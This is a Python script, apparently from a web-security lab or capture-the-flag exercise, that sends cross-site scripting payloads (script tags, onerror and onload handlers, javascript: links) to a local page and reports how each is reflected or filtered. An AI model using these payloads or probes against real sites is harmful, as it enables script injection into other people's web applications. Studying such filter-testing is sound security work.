import requests
import re

# Test payload categories
payloads = {
    "plain": "HelloTest",
    "html_tag": "<b>BOLD</b>",
    "script_tag": "<script>test</script>",
    "event_handler": '<img src=x onerror=alert(1)>',
    "attribute": '" onload=alert(1)>',
    "js_url": '<a href="javascript:alert(1)">click</a>',
    "special_chars": "<\">'&",
    "mixed_xss": '<img src=x onError=alert(\'XSS\')>'
}

base_url = "http://127.0.0.1:33081/page"

print("="*80)
print("XSS CONTEXT ANALYSIS")
print("="*80)

for category, payload in payloads.items():
    print(f"\n[+] Testing {category}: {payload}")
    
    try:
        # Make request with payload
        resp = requests.get(f"{base_url}?name={payload}", timeout=30)
        response_text = resp.text
        
        # Check if payload appears
        if payload in response_text:
            found = "Yes - RAW"
            # Find context
            idx = response_text.find(payload)
            context = response_text[max(0, idx-100):idx+len(payload)+100]
            print(f"  Status: {resp.status_code}")
            print(f"  Payload reflection: {found}")
            print(f"  Context snippet:\n{context}")
            
            # Analyze filter behavior
            if "<script>" in payload and "<script>" not in response_text:
                print("  Filter: Script tags removed/blocked")
            elif "onerror" in payload and "onerror=" not in response_text:
                print("  Filter: Event handlers removed")
            elif payload in response_text:
                print("  Filter: NONE - raw reflection")
        else:
            # Check for HTML encoded version
            import html
            encoded = html.escape(payload)
            if encoded in response_text:
                print(f"  Status: {resp.status_code}")
                print(f"  Payload reflection: Yes - HTML ENCODED")
                idx = response_text.find(encoded)
                context = response_text[max(0, idx-100):idx+len(encoded)+100]
                print(f"  Context snippet:\n{context}")
                print("  Filter: HTML entities encoded")
            else:
                print(f"  Status: {resp.status_code}")
                print(f"  Payload reflection: No - completely blocked/removed")
                
    except Exception as e:
        print(f"  ERROR: {e}")
    
    print("-"*80)

print("\n[+] Analysis complete.")
